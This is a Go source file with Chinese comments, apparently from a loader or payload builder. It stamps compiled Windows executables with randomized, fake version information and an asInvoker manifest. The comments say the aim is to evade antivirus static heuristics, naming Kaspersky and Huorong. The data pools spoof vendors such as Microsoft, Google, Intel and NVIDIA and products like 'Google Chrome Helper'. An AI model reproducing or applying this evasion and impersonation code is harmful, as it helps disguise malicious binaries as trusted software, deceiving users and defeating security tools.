package util

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"math/big"
	"os"

	"github.com/tc-hib/winres"
	"github.com/tc-hib/winres/version"
)

// ============================================================================
// 随机化 PE 版本信息（静态启发缓解）：
// 给产物写入一份拟真、随机的 VERSIONINFO（公司/产品/描述/版本号等），
// 降低“无版本信息的裸 Go/加载器”类静态启发命中（Kaspersky/火绒均会对 PE 元数据做启发）。
// 实现复用 winres（LoadFromEXE -> SetVersionInfo -> WriteToEXE），不影响可执行性。
// ============================================================================

// metaVendorPool / metaProductPool / metaDescPool：随机化版本信息用的取值池。
//
// 注意（真实 bug，勿回退）：池中**禁止出现 update / install / setup / assistant 等"安装程序"字样**。
// Windows 对**没有清单的 32 位可执行文件**启用"安装程序检测"启发式：只要版本资源里带
// Installer/Update/Setup 类关键字，CreateProcess 就会以 ERROR_ELEVATION_REQUIRED
// （"The requested operation requires elevation"）拒绝启动 —— 实测 386 产物在写入
// "Component Installer / Microsoft Edge Update" 后 100% 无法运行（x64 不受该启发式影响）。
// 现在除了避开这些字样，还统一写入 asInvoker 清单（见 RandomizePEResources）彻底关闭该启发式。
var metaVendorPool = []string{"Microsoft Corporation", "Google LLC", "Intel Corporation", "Advanced Micro Devices, Inc.", "Apple Inc.", "Oracle America, Inc.", "NVIDIA Corporation", "Lenovo Group Limited", "ASUSTeK Computer Inc.", "Realtek Semiconductor Corp."}

var metaProductPool = []string{"Windows Runtime Library", "Intel Graphics Control Panel", "AMD Software Console", "Realtek Audio Console", "Google Chrome Helper", "Microsoft Edge WebView", "NVIDIA Control Panel", "ASUS Armoury Crate", "Visual C++ Redistributable", "Microsoft .NET Runtime"}

var metaDescPool = []string{"Background Service", "Device Manager", "System Component", "Component Library", "Configuration Utility", "Diagnostics Helper", "Runtime Optimizer", "System Tray Helper", "Notification Service", "Hardware Monitor"}

var metaNameChars = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

// metaRandInt 返回 [min, max] 闭区间随机整数
func metaRandInt(min, max int) int {
	if max <= min {
		return min
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	if err != nil {
		return min
	}
	return min + int(n.Int64())
}

// metaRandName 生成随机 ASCII 标识串
func metaRandName(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = metaNameChars[metaRandInt(0, len(metaNameChars)-1)]
	}
	return string(b)
}

// metaRandVersion 生成随机 x.y.z.w
func metaRandVersion() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		metaRandInt(1, 9), metaRandInt(0, 99), metaRandInt(0, 9999), metaRandInt(0, 99999))
}

// parseVersionU16 解析 x.y.z.w -> [4]uint16
func parseVersionU16(s string) ([4]uint16, error) {
	var out [4]uint16
	cur := 0
	idx := 0
	have := false
	flush := func() error {
		if !have {
			return fmt.Errorf("无效版本号")
		}
		if idx < 4 {
			out[idx] = uint16(cur)
		}
		idx++
		cur = 0
		have = false
		return nil
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '.' {
			if err := flush(); err != nil {
				return out, err
			}
			continue
		}
		if c < '0' || c > '9' {
			return out, fmt.Errorf("无效版本号")
		}
		cur = cur*10 + int(c-'0')
		if cur > 65535 {
			return out, fmt.Errorf("版本段过大")
		}
		have = true
	}
	if err := flush(); err != nil {
		return out, err
	}
	return out, nil
}

// RandomizePEResources 为 PE 写入随机化拟真版本信息（覆盖/新建 .rsrc 中的 VERSIONINFO）。
func RandomizePEResources(exePath string) error {
	peBinary, err := os.ReadFile(exePath)
	if err != nil {
		return fmt.Errorf("读取 PE 失败: %w", err)
	}
	if len(peBinary) < 64 || peBinary[0] != 'M' || peBinary[1] != 'Z' {
		return fmt.Errorf("非 PE 文件")
	}

	rs, err := winres.LoadFromEXE(bytes.NewReader(peBinary))
	if err != nil {
		if err != winres.ErrNoResources {
			return fmt.Errorf("读取资源失败: %w", err)
		}
		rs = &winres.ResourceSet{}
	}
	if rs == nil {
		rs = &winres.ResourceSet{}
	}

	vendor := metaVendorPool[metaRandInt(0, len(metaVendorPool)-1)]
	product := metaProductPool[metaRandInt(0, len(metaProductPool)-1)]
	desc := metaDescPool[metaRandInt(0, len(metaDescPool)-1)]
	internal := metaRandName(6)
	fileVerStr := metaRandVersion()
	prodVerStr := metaRandVersion()
	fileVer, _ := parseVersionU16(fileVerStr)
	prodVer, _ := parseVersionU16(prodVerStr)

	vi := version.Info{
		FileVersion:    fileVer,
		ProductVersion: prodVer,
		Type:           version.App,
	}
	lang := uint16(version.LangDefault)
	set := func(key, val string) {
		_ = vi.Set(lang, key, val)
	}
	set(version.CompanyName, vendor)
	set(version.ProductName, product)
	set(version.FileDescription, desc)
	set(version.FileVersion, fileVerStr)
	set(version.ProductVersion, prodVerStr)
	set(version.InternalName, internal)
	set(version.OriginalFilename, internal+".exe")
	set(version.LegalCopyright, "(C) "+vendor+" All rights reserved.")

	rs.SetVersionInfo(vi)

	// 写入 asInvoker 清单：这是本函数能安全用于 32 位（386）产物的前提。
	// 没有清单时，Windows 会按版本资源关键字做"安装程序检测"启发式；一旦被判为安装程序
	// 就会要求提升权限，32 位产物将直接无法启动（详见 metaProductPool 上方注释）。
	// 声明 asInvoker 后该启发式不再生效，行为与未加清单时的默认 (asInvoker) 一致。
	rs.SetManifest(winres.AppManifest{
		ExecutionLevel: winres.AsInvoker,
		Compatibility:  winres.WinVistaAndAbove,
		DPIAwareness:   winres.DPIAware,
	})

	var out bytes.Buffer
	if err := rs.WriteToEXE(&out, bytes.NewReader(peBinary)); err != nil {
		return fmt.Errorf("写入资源失败: %w", err)
	}
	return os.WriteFile(exePath, out.Bytes(), 0o666)
}
